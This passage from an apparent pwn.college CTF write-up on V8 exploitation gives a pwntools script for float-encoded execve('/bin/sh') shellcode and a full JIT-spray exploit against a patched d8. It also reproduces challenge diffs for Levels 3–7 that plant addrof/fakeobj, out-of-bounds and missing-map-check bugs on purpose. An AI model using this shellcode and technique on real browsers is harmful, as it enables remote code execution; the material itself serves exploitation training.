Due to [V8 Sandbox](https://docs.google.com/document/d/1FM4fQmIhEqPG8uGp5o9A-mnPB5BOeScZYpkHjo0KKA8/edit?tab=t.0#heading=h.xzptrog8pyxf), this method is no longer viable. `WebAssembly (WASM)` memory is no longer laid out adjacent to the JavaScript heap. V8 also now replaces raw external pointers with internal table indices—for example, references to `WASM RWX` pages or `ArrayBuffer` backing stores are abstracted through lookup tables. This design prevents direct memory access, meaning traditional exploitation techniques that rely on raw pointer manipulation for arbitrary read/write are no longer effective.

So Instead, we'll be using a technique known as [JIT Spray](https://en.wikipedia.org/wiki/JIT_spraying). JIT (Just-In-Time) Spray is an exploitation technique that leverages JavaScript engine optimizations (in this case- Turbofan) to create executable memory regions (RX JIT pages) containing attacker-controlled code. 

With arbitrary read and write primitives, an attacker can locate the JIT-compiled code object in memory—either by scanning the heap or leveraging known object layout patterns. Once identified, they extract the address of the `RX` (read-execute) memory region that holds the compiled JIT code. This region is then searched for a known sprayed pattern, such as `0x90909090` (representing `NOP` instructions in x86), which was deliberately embedded during the JIT compilation phase to serve as a predictable marker. Once the sprayed pattern is found, its address is written over the position of the `RWX` address.

Prior to this, the attacker prepares shellcode encoded as an array of IEEE-754 floating-point numbers, with each float representing `6 bytes` of shellcode followed by a `2-byte` jump shellcode to the next float (making total of `8 bytes`). So, as a result, when the JIT-compiled function is invoked, control flow is redirected to the attacker's crafted sequence in the JIT region, allowing arbitrary code execution. You can learn more about the technique in this [blog](https://www.matteomalvica.com/blog/2024/06/05/intro-v8-exploitation-maglev/#jit-spraying-shellcode) and this[CTF Writeup].(https://mem2019.github.io/jekyll/update/2022/02/06/DiceCTF-Memory-Hole.html). 

So, let's start with the shellcode first, then we'll work our way towards the exploit. To generate the floating number shellcode as described above, we can use a python script like -

```python
from pwn import *

context(arch='amd64')
jmp = b'\xeb\x0c'
shell = u64(b'/bin/sh\x00')

def make_double(code):
	assert len(code) <= 6
	print(hex(u64(code.ljust(6, b'\x90') + jmp))[2:])

make_double(asm("push %d; pop rax" % (shell >> 0x20)))
make_double(asm("push %d; pop rdx" % (shell % 0x100000000)))
make_double(asm("shl rax, 0x20; xor esi, esi"))
make_double(asm("add rax, rdx; xor edx, edx; push rax"))
code = asm("mov rdi, rsp; push 59; pop rax; syscall")
assert len(code) <= 8
print(hex(u64(code.ljust(8, b'\x90')))[2:])

"""
Output:
ceb580068732f68
ceb5a6e69622f68
cebf63120e0c148
ceb50d231d00148
50f583b6ae78948
"""
```

```js
const shellcode = () => {
    return [
		1.95538254221075331056310651818E-246,
		1.95606125582421466942709801013E-246,
		1.99957147195425773436923756715E-246,
		1.95337673326740932133292175341E-246,
		2.63486047652296056448306022844E-284];
}

for (let  i= 0 ; i<10000; i++) { shellcode(); } 
```

```js
shellcode_addr =  GetAddressOf(shellcode); 
console.log("shellcode func addres = "  + shellcode_addr); 
```

```js
code_addr =  ArbRead32(shellcode_addr +  0xc ); 
console.log("code address = "  + code_addr); 
```


```js
rwx_addr =  ArbRead32(code_addr -  1  +  0x14 ); 
console.log("rwx address = " +rwx_addr); 
```


```js
float_shellcode_addr = rwx_addr +   0x69  +  2 ; 
ArbWrite32(code_addr - 1 + 0x14, float_shellcode_addr); 
```

Finally, we will trigger the execution of our shellcode by invoking the `shellcode()` function that we just patched.

```js
console.log("Spawning Shell...")
shellcode() 
```

The final exploit is shown below.

```js
const shellcode = () => {
    return [
		1.95538254221075331056310651818E-246,
		1.95606125582421466942709801013E-246,
		1.99957147195425773436923756715E-246,
		1.95337673326740932133292175341E-246,
		2.63486047652296056448306022844E-284];
}

for (let  i= 0 ; i<10000; i++) { shellcode(); } 

shellcode_addr =  GetAddressOf(shellcode); 
console.log("shellcode func addres = "  + shellcode_addr); 

code_addr =  ArbRead32(shellcode_addr +  0xc ); 
console.log("code address = "  + code_addr); 

rwx_addr =  ArbRead32(code_addr -  1  +  0x14 ); 
console.log("rwx address = " +rwx_addr); 

float_shellcode_addr = rwx_addr +   0x69  +  2 ; 
ArbWrite32(code_addr - 1 + 0x14, float_shellcode_addr); 

console.log("Spawning Shell...")
shellcode() 
```


After executing the above `exp.js` using `/challenge/run` provided in the VM, you should... get a shell!

![Desktop View](/assets/Browser/CTFs/V8_PwnCollege_Adventure/solution_2.png){: width="550" height="350" }

## Level 3 - Objects are Fake

### Patch Analysis

Let's analyze the `patch` file given in the `/challenge` directory and see it's contents.

```diff
diff --git a/src/d8/d8.cc b/src/d8/d8.cc
index facf0d86d79..0299ed26802 100644
--- a/src/d8/d8.cc
+++ b/src/d8/d8.cc
@@ -1283,6 +1283,52 @@ struct ModuleResolutionData {
 
 }  // namespace
 
+void Shell::GetAddressOf(const v8::FunctionCallbackInfo<v8::Value>& info) {
+  v8::Isolate* isolate = info.GetIsolate();
+
+  if (info.Length() == 0) {
+    isolate->ThrowError("First argument must be provided");
+    return;
+  }
+
+  internal::Handle<internal::Object> arg = Utils::OpenHandle(*info[0]);
+  if (!IsHeapObject(*arg)) {
+    isolate->ThrowError("First argument must be a HeapObject");
+    return;
+  }
+  internal::Tagged<internal::HeapObject> obj = internal::Cast<internal::HeapObject>(*arg);
+
+  uint32_t address = static_cast<uint32_t>(obj->address());
+  info.GetReturnValue().Set(v8::Integer::NewFromUnsigned(isolate, address));
+}
+
+void Shell::GetFakeObject(const v8::FunctionCallbackInfo<v8::Value>& info) {
+	v8::Isolate *isolate = info.GetIsolate();
+	Local<v8::Context> context = isolate->GetCurrentContext();
+
+	if (info.Length() != 1) {
+		isolate->ThrowError("Need exactly one argument");
+		return;
+	}
+
+	Local<v8::Uint32> arg;
+	if (!info[0]->ToUint32(context).ToLocal(&arg)) {
+		isolate->ThrowError("Argument must be a number");
+		return;
+	}
+	
+	uint32_t addr = arg->Value();
+
+	internal::PtrComprCageBase cage_base = internal::GetPtrComprCageBase();
+	internal::Address base_addr = internal::V8HeapCompressionScheme::GetPtrComprCageBaseAddress(cage_base);
+	uint64_t full_addr = base_addr + (uint64_t)addr;
+
+	internal::Tagged<internal::HeapObject> obj = internal::HeapObject::FromAddress(full_addr);
+	internal::Isolate *i_isolate = reinterpret_cast<internal::Isolate*>(isolate);
+	internal::Handle<internal::Object> obj_handle(obj, i_isolate);
+	info.GetReturnValue().Set(ToApiHandle<v8::Value>(obj_handle));
+}
+
 void Shell::ModuleResolutionSuccessCallback(
     const FunctionCallbackInfo<Value>& info) {
   DCHECK(i::ValidateCallbackInfo(info));
@@ -3364,7 +3410,11 @@ Local<FunctionTemplate> Shell::CreateNodeTemplates(
 
 Local<ObjectTemplate> Shell::CreateGlobalTemplate(Isolate* isolate) {
   Local<ObjectTemplate> global_template = ObjectTemplate::New(isolate);
-  global_template->Set(Symbol::GetToStringTag(isolate),
+  global_template->Set(isolate, "GetAddressOf",
+                       FunctionTemplate::New(isolate, GetAddressOf));
+  global_template->Set(isolate, "GetFakeObject",
+                       FunctionTemplate::New(isolate, GetFakeObject));
+/*  global_template->Set(Symbol::GetToStringTag(isolate),
                        String::NewFromUtf8Literal(isolate, "global"));
   global_template->Set(isolate, "version",
                        FunctionTemplate::New(isolate, Version));
@@ -3385,13 +3435,13 @@ Local<ObjectTemplate> Shell::CreateGlobalTemplate(Isolate* isolate) {
   global_template->Set(isolate, "readline",
                        FunctionTemplate::New(isolate, ReadLine));
   global_template->Set(isolate, "load",
-                       FunctionTemplate::New(isolate, ExecuteFile));
+                       FunctionTemplate::New(isolate, ExecuteFile));*/
   global_template->Set(isolate, "setTimeout",
                        FunctionTemplate::New(isolate, SetTimeout));
   // Some Emscripten-generated code tries to call 'quit', which in turn would
   // call C's exit(). This would lead to memory leaks, because there is no way
   // we can terminate cleanly then, so we need a way to hide 'quit'.
-  if (!options.omit_quit) {
+/*  if (!options.omit_quit) {
     global_template->Set(isolate, "quit", FunctionTemplate::New(isolate, Quit));
   }
   global_template->Set(isolate, "testRunner",
@@ -3410,7 +3460,7 @@ Local<ObjectTemplate> Shell::CreateGlobalTemplate(Isolate* isolate) {
   if (i::v8_flags.expose_async_hooks) {
     global_template->Set(isolate, "async_hooks",
                          Shell::CreateAsyncHookTemplate(isolate));
-  }
+  }*/
 
   return global_template;
 }
diff --git a/src/d8/d8.h b/src/d8/d8.h
index a19d4a0eae4..fbb091afbaf 100644
--- a/src/d8/d8.h
+++ b/src/d8/d8.h
@@ -507,6 +507,8 @@ class Shell : public i::AllStatic {
   };
   enum class CodeType { kFileName, kString, kFunction, kInvalid, kNone };
 
+  static void GetAddressOf(const v8::FunctionCallbackInfo<v8::Value>& args);
+  static void GetFakeObject(const v8::FunctionCallbackInfo<v8::Value>& args);
   static bool ExecuteString(Isolate* isolate, Local<String> source,
                             Local<String> name,
                             ReportExceptions report_exceptions,
```

Okay, so the `GetAddressOf` function is the same that we had seen [earlier](http://127.0.0.1:4000/posts/V8-PwnCollege-Adventure/#address-of-primitive). Now, instead of Aribitrary Read/Write primitives we are given a function called `GetFakeObject`. Let's see what it does.

#### Fake Object Primitive

```cpp
void Shell::GetFakeObject(const v8::FunctionCallbackInfo<v8::Value>& info) {
	v8::Isolate *isolate = info.GetIsolate();
	Local<v8::Context> context = isolate->GetCurrentContext();

	if (info.Length() != 1) {
		isolate->ThrowError("Need exactly one argument");
		return;
	}

	Local<v8::Uint32> arg;
	if (!info[0]->ToUint32(context).ToLocal(&arg)) {
		isolate->ThrowError("Argument must be a number");
		return;
	}
	
	uint32_t addr = arg->Value();

	internal::PtrComprCageBase cage_base = internal::GetPtrComprCageBase();
	internal::Address base_addr = internal::V8HeapCompressionScheme::GetPtrComprCageBaseAddress(cage_base);
	uint64_t full_addr = base_addr  (uint64_t)addr;

	internal::Tagged<internal::HeapObject> obj = internal::HeapObject::FromAddress(full_addr);
	internal::Isolate *i_isolate = reinterpret_cast<internal::Isolate*>(isolate);
	internal::Handle<internal::Object> obj_handle(obj, i_isolate);
	info.GetReturnValue().Set(ToApiHandle<v8::Value>(obj_handle));
}
```

The `GetFakeObject` enables construction of fake objects from raw memory addresses—a fundamental primitive in V8 exploitation. Specifically, it provides the inverse of the `addrof` primitive: while `addrof` allows attackers to obtain the memory address of a JavaScript object, this function, often referred to as `fakeobj`, takes a raw address (typically as a 32-bit number) and treats it as a V8 object. 

The function begins by declaring its interface `(void Shell::GetFakeObject...)`, exposing this capability to JavaScript. It first establishes the execution environment by retrieving the current `V8 isolate` and JavaScript context `(v8::Isolate *isolate...)`, then validates that exactly one argument is passed `(if (info.Length() != 1))`. The JavaScript argument is converted to a 32-bit unsigned integer `(info[0]->ToUint32(context))` and its raw value extracted `(uint32_t addr = arg->Value())`.

Crucially, the function handles V8's pointer compression scheme by obtaining the heap base address `(internal::GetPtrComprCageBase())` and combining it with the input address to form a complete 64-bit pointer `(base_addr + (uint64_t)addr)`. Then it creates a fake V8 heap object at this computed address `(HeapObject::FromAddress(full_addr))`, effectively treating arbitrary memory as a valid V8 object - an unsafe operation that forms the basis of its exploitation utility. This raw object is then wrapped in a V8 handle `(Handle<internal::Object> obj_handle...)` and returned to JavaScript `(info.GetReturnValue().Set...)`, completing the illusion of a legitimate object.

When paired with `addrof`, this primitive enables arbitrary read and write, facilitating powerful exploit techniques which could be chained with executing shellcode via JIT spray as we did in [Level 2](http://127.0.0.1:4000/posts/V8-PwnCollege-Adventure/#exploitation-1). To learn more about the relation between `addrof` and `fakeobj` primtives you may refer to this [article](https://trustfoundry.net/2025/03/28/browser-exploitation-basics-explaining-the-addrof-and-fakeobj-primitives/).

### Exploitation

## Level 4 - Controlled Length OOB 

### Patch Analysis

```diff
diff --git a/BUILD.gn b/BUILD.gn
index c0192593c4a..83e264723f7 100644
--- a/BUILD.gn
+++ b/BUILD.gn
@@ -1889,6 +1889,7 @@ if (v8_postmortem_support) {
 }
 
 torque_files = [
+  "src/builtins/array-setlength.tq",
   "src/builtins/aggregate-error.tq",
   "src/builtins/array-at.tq",
   "src/builtins/array-concat.tq",
diff --git a/src/builtins/array-setlength.tq b/src/builtins/array-setlength.tq
new file mode 100644
index 00000000000..4a2a864af44
--- /dev/null
+++ b/src/builtins/array-setlength.tq
@@ -0,0 +1,14 @@
+namespace array {
+transitioning javascript builtin
+ArrayPrototypeSetLength(
+  js-implicit context: NativeContext, receiver: JSAny)(length: JSAny): JSAny {
+    try {
+      const len: Smi = Cast<Smi>(length) otherwise ErrorLabel;
+      const array: JSArray = Cast<JSArray>(receiver) otherwise ErrorLabel;
+      array.length = len;
+    } label ErrorLabel {
+        Print("Nope");
+    }
+    return receiver;
+}
+}
diff --git a/src/d8/d8.cc b/src/d8/d8.cc
index facf0d86d79..382c015bc48 100644
--- a/src/d8/d8.cc
+++ b/src/d8/d8.cc
@@ -3364,7 +3364,7 @@ Local<FunctionTemplate> Shell::CreateNodeTemplates(
 
 Local<ObjectTemplate> Shell::CreateGlobalTemplate(Isolate* isolate) {
   Local<ObjectTemplate> global_template = ObjectTemplate::New(isolate);
-  global_template->Set(Symbol::GetToStringTag(isolate),
+/*  global_template->Set(Symbol::GetToStringTag(isolate),
                        String::NewFromUtf8Literal(isolate, "global"));
   global_template->Set(isolate, "version",
                        FunctionTemplate::New(isolate, Version));
@@ -3385,13 +3385,13 @@ Local<ObjectTemplate> Shell::CreateGlobalTemplate(Isolate* isolate) {
   global_template->Set(isolate, "readline",
                        FunctionTemplate::New(isolate, ReadLine));
   global_template->Set(isolate, "load",
-                       FunctionTemplate::New(isolate, ExecuteFile));
+                       FunctionTemplate::New(isolate, ExecuteFile));*/
   global_template->Set(isolate, "setTimeout",
                        FunctionTemplate::New(isolate, SetTimeout));
   // Some Emscripten-generated code tries to call 'quit', which in turn would
   // call C's exit(). This would lead to memory leaks, because there is no way
   // we can terminate cleanly then, so we need a way to hide 'quit'.
-  if (!options.omit_quit) {
+/*  if (!options.omit_quit) {
     global_template->Set(isolate, "quit", FunctionTemplate::New(isolate, Quit));
   }
   global_template->Set(isolate, "testRunner",
@@ -3410,7 +3410,7 @@ Local<ObjectTemplate> Shell::CreateGlobalTemplate(Isolate* isolate) {
   if (i::v8_flags.expose_async_hooks) {
     global_template->Set(isolate, "async_hooks",
                          Shell::CreateAsyncHookTemplate(isolate));
-  }
+  }*/
 
   return global_template;
 }
diff --git a/src/init/bootstrapper.cc b/src/init/bootstrapper.cc
index 48249695b7b..f3379ac47ec 100644
--- a/src/init/bootstrapper.cc
+++ b/src/init/bootstrapper.cc
@@ -2531,6 +2531,8 @@ void Genesis::InitializeGlobal(Handle<JSGlobalObject> global_object,
     JSObject::AddProperty(isolate_, proto, factory->constructor_string(),
                           array_function, DONT_ENUM);
 
+    SimpleInstallFunction(isolate_, proto, "setLength",
+                          Builtin::kArrayPrototypeSetLength, 1, true);
     SimpleInstallFunction(isolate_, proto, "at", Builtin::kArrayPrototypeAt, 1,
                           true);
     SimpleInstallFunction(isolate_, proto, "concat",
```

## Level 5 - Off by One

### Patch Analysis

```diff
diff --git a/src/builtins/builtins-array.cc b/src/builtins/builtins-array.cc
index ea45a7ada6b..4ed66c8113f 100644
--- a/src/builtins/builtins-array.cc
+++ b/src/builtins/builtins-array.cc
@@ -407,6 +407,46 @@ BUILTIN(ArrayPush) {
   return *isolate->factory()->NewNumberFromUint((new_length));
 }
 
+BUILTIN(ArrayOffByOne) {
+	HandleScope scope(isolate);
+	Factory *factory = isolate->factory();
+	Handle<Object> receiver = args.receiver();
+
+	if (!IsJSArray(*receiver) || !HasOnlySimpleReceiverElements(isolate, Cast<JSArray>(*receiver))) {
+	  THROW_NEW_ERROR_RETURN_FAILURE(isolate, NewTypeError(MessageTemplate::kPlaceholderOnly,
+    	factory->NewStringFromAsciiChecked("Nope")));
+	}
+
+	Handle<JSArray> array = Cast<JSArray>(receiver);
+
+	ElementsKind kind = array->GetElementsKind();
+
+	if (kind != PACKED_DOUBLE_ELEMENTS) {
+	  THROW_NEW_ERROR_RETURN_FAILURE(isolate, NewTypeError(MessageTemplate::kPlaceholderOnly,
+    	factory->NewStringFromAsciiChecked("Need an array of double numbers")));
+	}
+
+	if (args.length() > 2) {
+	  THROW_NEW_ERROR_RETURN_FAILURE(isolate, NewTypeError(MessageTemplate::kPlaceholderOnly,
+    	factory->NewStringFromAsciiChecked("Too many arguments")));
+	}
+	
+	Handle<FixedDoubleArray> elements(Cast<FixedDoubleArray>(array->elements()), isolate);
+	uint32_t len = static_cast<uint32_t>(Object::NumberValue(array->length()));
+	if (args.length() == 1) {	// read mode
+		return *(isolate->factory()->NewNumber(elements->get_scalar(len)));
+	} else {	// write mode
+		Handle<Object> value = args.at(1);
+		if (!IsNumber(*value)) {
+		  THROW_NEW_ERROR_RETURN_FAILURE(isolate, NewTypeError(MessageTemplate::kPlaceholderOnly,
+    		factory->NewStringFromAsciiChecked("Need a number argument")));
+		}
+		double num = static_cast<double>(Object::NumberValue(*value));
+		elements->set(len, num);
+		return ReadOnlyRoots(isolate).undefined_value();
+	}
+}
+
 namespace {
 
 V8_WARN_UNUSED_RESULT Tagged<Object> GenericArrayPop(Isolate* isolate,
diff --git a/src/builtins/builtins-definitions.h b/src/builtins/builtins-definitions.h
index 78cbf8874ed..8a0bd959a29 100644
--- a/src/builtins/builtins-definitions.h
+++ b/src/builtins/builtins-definitions.h
@@ -394,6 +394,7 @@ namespace internal {
       ArraySingleArgumentConstructor)                                          \
   TFC(ArrayNArgumentsConstructor, ArrayNArgumentsConstructor)                  \
   CPP(ArrayConcat)                                                             \
+  CPP(ArrayOffByOne)                                                           \
   /* ES6 #sec-array.prototype.fill */                                          \
   CPP(ArrayPrototypeFill)                                                      \
   /* ES7 #sec-array.prototype.includes */                                      \
diff --git a/src/compiler/typer.cc b/src/compiler/typer.cc
index 9a346d134b9..ce31f92b876 100644
--- a/src/compiler/typer.cc
+++ b/src/compiler/typer.cc
@@ -1937,6 +1937,8 @@ Type Typer::Visitor::JSCallTyper(Type fun, Typer* t) {
       return Type::Receiver();
     case Builtin::kArrayUnshift:
       return t->cache_->kPositiveSafeInteger;
+	case Builtin::kArrayOffByOne:
+	  return Type::Receiver();
 
     // ArrayBuffer functions.
     case Builtin::kArrayBufferIsView:
diff --git a/src/d8/d8.cc b/src/d8/d8.cc
index facf0d86d79..382c015bc48 100644
--- a/src/d8/d8.cc
+++ b/src/d8/d8.cc
@@ -3364,7 +3364,7 @@ Local<FunctionTemplate> Shell::CreateNodeTemplates(
 
 Local<ObjectTemplate> Shell::CreateGlobalTemplate(Isolate* isolate) {
   Local<ObjectTemplate> global_template = ObjectTemplate::New(isolate);
-  global_template->Set(Symbol::GetToStringTag(isolate),
+/*  global_template->Set(Symbol::GetToStringTag(isolate),
                        String::NewFromUtf8Literal(isolate, "global"));
   global_template->Set(isolate, "version",
                        FunctionTemplate::New(isolate, Version));
@@ -3385,13 +3385,13 @@ Local<ObjectTemplate> Shell::CreateGlobalTemplate(Isolate* isolate) {
   global_template->Set(isolate, "readline",
                        FunctionTemplate::New(isolate, ReadLine));
   global_template->Set(isolate, "load",
-                       FunctionTemplate::New(isolate, ExecuteFile));
+                       FunctionTemplate::New(isolate, ExecuteFile));*/
   global_template->Set(isolate, "setTimeout",
                        FunctionTemplate::New(isolate, SetTimeout));
   // Some Emscripten-generated code tries to call 'quit', which in turn would
   // call C's exit(). This would lead to memory leaks, because there is no way
   // we can terminate cleanly then, so we need a way to hide 'quit'.
-  if (!options.omit_quit) {
+/*  if (!options.omit_quit) {
     global_template->Set(isolate, "quit", FunctionTemplate::New(isolate, Quit));
   }
   global_template->Set(isolate, "testRunner",
@@ -3410,7 +3410,7 @@ Local<ObjectTemplate> Shell::CreateGlobalTemplate(Isolate* isolate) {
   if (i::v8_flags.expose_async_hooks) {
     global_template->Set(isolate, "async_hooks",
                          Shell::CreateAsyncHookTemplate(isolate));
-  }
+  }*/
 
   return global_template;
 }
diff --git a/src/init/bootstrapper.cc b/src/init/bootstrapper.cc
index 48249695b7b..99dc014c13c 100644
--- a/src/init/bootstrapper.cc
+++ b/src/init/bootstrapper.cc
@@ -2533,6 +2533,8 @@ void Genesis::InitializeGlobal(Handle<JSGlobalObject> global_object,
 
     SimpleInstallFunction(isolate_, proto, "at", Builtin::kArrayPrototypeAt, 1,
                           true);
+    SimpleInstallFunction(isolate_, proto, "offByOne",
+                          Builtin::kArrayOffByOne, 1, false);
     SimpleInstallFunction(isolate_, proto, "concat",
                           Builtin::kArrayPrototypeConcat, 1, false);
     SimpleInstallFunction(isolate_, proto, "copyWithin",
```

## Level 6 - Array Function Map

### Patch Analysis

```diff
diff --git a/src/builtins/builtins-array.cc b/src/builtins/builtins-array.cc
index ea45a7ada6b..d450412f3e6 100644
--- a/src/builtins/builtins-array.cc
+++ b/src/builtins/builtins-array.cc
@@ -407,6 +407,53 @@ BUILTIN(ArrayPush) {
   return *isolate->factory()->NewNumberFromUint((new_length));
 }
 
+BUILTIN(ArrayFunctionMap) {
+	HandleScope scope(isolate);
+	Factory *factory = isolate->factory();
+	Handle<Object> receiver = args.receiver();
+
+	if (!IsJSArray(*receiver) || !HasOnlySimpleReceiverElements(isolate, Cast<JSArray>(*receiver))) {
+	  THROW_NEW_ERROR_RETURN_FAILURE(isolate, NewTypeError(MessageTemplate::kPlaceholderOnly,
+    	factory->NewStringFromAsciiChecked("Nope")));
+	}
+
+	Handle<JSArray> array = Cast<JSArray>(receiver);
+
+	ElementsKind kind = array->GetElementsKind();
+
+	if (kind != PACKED_DOUBLE_ELEMENTS) {
+	  THROW_NEW_ERROR_RETURN_FAILURE(isolate, NewTypeError(MessageTemplate::kPlaceholderOnly,
+    	factory->NewStringFromAsciiChecked("Need an array of double numbers")));
+	}
+
+	if (args.length() != 2) {
+	  THROW_NEW_ERROR_RETURN_FAILURE(isolate, NewTypeError(MessageTemplate::kPlaceholderOnly,
+    	factory->NewStringFromAsciiChecked("Need exactly one argument")));
+	}
+	
+	uint32_t len = static_cast<uint32_t>(Object::NumberValue(array->length()));
+
+	Handle<Object> func_obj = args.at(1);
+	if (!IsJSFunction(*func_obj)) {
+	  THROW_NEW_ERROR_RETURN_FAILURE(isolate, NewTypeError(MessageTemplate::kPlaceholderOnly,
+    	factory->NewStringFromAsciiChecked("The argument must be a function")));
+	}
+	
+	for (uint32_t i = 0; i < len; i++) {
+		double elem = Cast<FixedDoubleArray>(array->elements())->get_scalar(i);
+		Handle<Object> elem_handle = factory->NewHeapNumber(elem);
+		Handle<Object> result = Execution::Call(isolate, func_obj, array, 1, &elem_handle).ToHandleChecked();
+		if (!IsNumber(*result)) {
+		  THROW_NEW_ERROR_RETURN_FAILURE(isolate, NewTypeError(MessageTemplate::kPlaceholderOnly,
+    		factory->NewStringFromAsciiChecked("The function must return a number")));
+		}
+		double result_value = static_cast<double>(Object::NumberValue(*result));
+		Cast<FixedDoubleArray>(array->elements())->set(i, result_value);
+	}
+
+	return ReadOnlyRoots(isolate).undefined_value();
+}
+
 namespace {
 
 V8_WARN_UNUSED_RESULT Tagged<Object> GenericArrayPop(Isolate* isolate,
diff --git a/src/builtins/builtins-definitions.h b/src/builtins/builtins-definitions.h
index 78cbf8874ed..ede2775903e 100644
--- a/src/builtins/builtins-definitions.h
+++ b/src/builtins/builtins-definitions.h
@@ -394,6 +394,7 @@ namespace internal {
       ArraySingleArgumentConstructor)                                          \
   TFC(ArrayNArgumentsConstructor, ArrayNArgumentsConstructor)                  \
   CPP(ArrayConcat)                                                             \
+  CPP(ArrayFunctionMap)                                                        \
   /* ES6 #sec-array.prototype.fill */                                          \
   CPP(ArrayPrototypeFill)                                                      \
   /* ES7 #sec-array.prototype.includes */                                      \
diff --git a/src/compiler/typer.cc b/src/compiler/typer.cc
index 9a346d134b9..33cf2d2edad 100644
--- a/src/compiler/typer.cc
+++ b/src/compiler/typer.cc
@@ -1937,6 +1937,8 @@ Type Typer::Visitor::JSCallTyper(Type fun, Typer* t) {
       return Type::Receiver();
     case Builtin::kArrayUnshift:
       return t->cache_->kPositiveSafeInteger;
+	case Builtin::kArrayFunctionMap:
+	  return Type::Receiver();
 
     // ArrayBuffer functions.
     case Builtin::kArrayBufferIsView:
diff --git a/src/d8/d8.cc b/src/d8/d8.cc
index facf0d86d79..382c015bc48 100644
--- a/src/d8/d8.cc
+++ b/src/d8/d8.cc
@@ -3364,7 +3364,7 @@ Local<FunctionTemplate> Shell::CreateNodeTemplates(
 
 Local<ObjectTemplate> Shell::CreateGlobalTemplate(Isolate* isolate) {
   Local<ObjectTemplate> global_template = ObjectTemplate::New(isolate);
-  global_template->Set(Symbol::GetToStringTag(isolate),
+/*  global_template->Set(Symbol::GetToStringTag(isolate),
                        String::NewFromUtf8Literal(isolate, "global"));
   global_template->Set(isolate, "version",
                        FunctionTemplate::New(isolate, Version));
@@ -3385,13 +3385,13 @@ Local<ObjectTemplate> Shell::CreateGlobalTemplate(Isolate* isolate) {
   global_template->Set(isolate, "readline",
                        FunctionTemplate::New(isolate, ReadLine));
   global_template->Set(isolate, "load",
-                       FunctionTemplate::New(isolate, ExecuteFile));
+                       FunctionTemplate::New(isolate, ExecuteFile));*/
   global_template->Set(isolate, "setTimeout",
                        FunctionTemplate::New(isolate, SetTimeout));
   // Some Emscripten-generated code tries to call 'quit', which in turn would
   // call C's exit(). This would lead to memory leaks, because there is no way
   // we can terminate cleanly then, so we need a way to hide 'quit'.
-  if (!options.omit_quit) {
+/*  if (!options.omit_quit) {
     global_template->Set(isolate, "quit", FunctionTemplate::New(isolate, Quit));
   }
   global_template->Set(isolate, "testRunner",
@@ -3410,7 +3410,7 @@ Local<ObjectTemplate> Shell::CreateGlobalTemplate(Isolate* isolate) {
   if (i::v8_flags.expose_async_hooks) {
     global_template->Set(isolate, "async_hooks",
                          Shell::CreateAsyncHookTemplate(isolate));
-  }
+  }*/
 
   return global_template;
 }
diff --git a/src/init/bootstrapper.cc b/src/init/bootstrapper.cc
index 48249695b7b..5e76e66bc15 100644
--- a/src/init/bootstrapper.cc
+++ b/src/init/bootstrapper.cc
@@ -2533,6 +2533,8 @@ void Genesis::InitializeGlobal(Handle<JSGlobalObject> global_object,
 
     SimpleInstallFunction(isolate_, proto, "at", Builtin::kArrayPrototypeAt, 1,
                           true);
+	SimpleInstallFunction(isolate_, proto, "functionMap",
+	                      Builtin::kArrayFunctionMap, 1, false);
     SimpleInstallFunction(isolate_, proto, "concat",
                           Builtin::kArrayPrototypeConcat, 1, false);
     SimpleInstallFunction(isolate_, proto, "copyWithin",
```

## Level 7 - Turbo doesn't check Map

### Patch Analysis

```diff
diff --git a/src/compiler/turboshaft/machine-lowering-reducer-inl.h b/src/compiler/turboshaft/machine-lowering-reducer-inl.h
index 170db78717b..17b0fe5c4e9 100644
--- a/src/compiler/turboshaft/machine-lowering-reducer-inl.h
+++ b/src/compiler/turboshaft/machine-lowering-reducer-inl.h
@@ -2740,7 +2740,7 @@ class MachineLoweringReducer : public Next {
                             const ZoneRefSet<Map>& maps, CheckMapsFlags flags,
                             const FeedbackSource& feedback) {
     if (maps.is_empty()) {
-      __ Deoptimize(frame_state, DeoptimizeReason::kWrongMap, feedback);
+      //__ Deoptimize(frame_state, DeoptimizeReason::kWrongMap, feedback);
       return {};
     }
 
@@ -2749,14 +2749,14 @@ class MachineLoweringReducer : public Next {
       IF_NOT (LIKELY(CompareMapAgainstMultipleMaps(heap_object_map, maps))) {
         // Reloading the map slightly reduces register pressure, and we are on a
         // slow path here anyway.
-        MigrateInstanceOrDeopt(heap_object, __ LoadMapField(heap_object),
-                               frame_state, feedback);
-        __ DeoptimizeIfNot(__ CompareMaps(heap_object, maps), frame_state,
-                           DeoptimizeReason::kWrongMap, feedback);
+        //MigrateInstanceOrDeopt(heap_object, __ LoadMapField(heap_object),
+        //                       frame_state, feedback);
+        //__ DeoptimizeIfNot(__ CompareMaps(heap_object, maps), frame_state,
+        //                   DeoptimizeReason::kWrongMap, feedback);
       }
     } else {
-      __ DeoptimizeIfNot(__ CompareMaps(heap_object, maps), frame_state,
-                         DeoptimizeReason::kWrongMap, feedback);
+      //__ DeoptimizeIfNot(__ CompareMaps(heap_object, maps), frame_state,
+      //                   DeoptimizeReason::kWrongMap, feedback);
     }
     // Inserting a AssumeMap so that subsequent optimizations know the map of
     // this object.
diff --git a/src/d8/d8.cc b/src/d8/d8.cc
index facf0d86d79..382c015bc48 100644
--- a/src/d8/d8.cc
+++ b/src/d8/d8.cc
@@ -3364,7 +3364,7 @@ Local<FunctionTemplate> Shell::CreateNodeTemplates(
 
 Local<ObjectTemplate> Shell::CreateGlobalTemplate(Isolate* isolate) {
   Local<ObjectTemplate> global_template = ObjectTemplate::New(isolate);
-  global_template->Set(Symbol::GetToStringTag(isolate),
+/*  global_template->Set(Symbol::GetToStringTag(isolate),
                        String::NewFromUtf8Literal(isolate, "global"));
   global_template->Set(isolate, "version",
                        FunctionTemplate::New(isolate, Version));
@@ -3385,13 +3385,13 @@ Local<ObjectTemplate> Shell::CreateGlobalTemplate(Isolate* isolate) {
   global_template->Set(isolate, "readline",
                        FunctionTemplate::New(isolate, ReadLine));
   global_template->Set(isolate, "load",
-                       FunctionTemplate::New(isolate, ExecuteFile));
+                       FunctionTemplate::New(isolate, ExecuteFile));*/
   global_template->Set(isolate, "setTimeout",
                        FunctionTemplate::New(isolate, SetTimeout));
   // Some Emscripten-generated code tries to call 'quit', which in turn would
   // call C's exit(). This would lead to memory leaks, because there is no way
   // we can terminate cleanly then, so we need a way to hide 'quit'.
-  if (!options.omit_quit) {
+/*  if (!options.omit_quit) {
     global_template->Set(isolate, "quit", FunctionTemplate::New(isolate, Quit));
   }
   global_template->Set(isolate, "testRunner",
@@ -3410,7 +3410,7 @@ Local<ObjectTemplate> Shell::CreateGlobalTemplate(Isolate* isolate) {
   if (i::v8_flags.expose_async_hooks) {
     global_template->Set(isolate, "async_hooks",
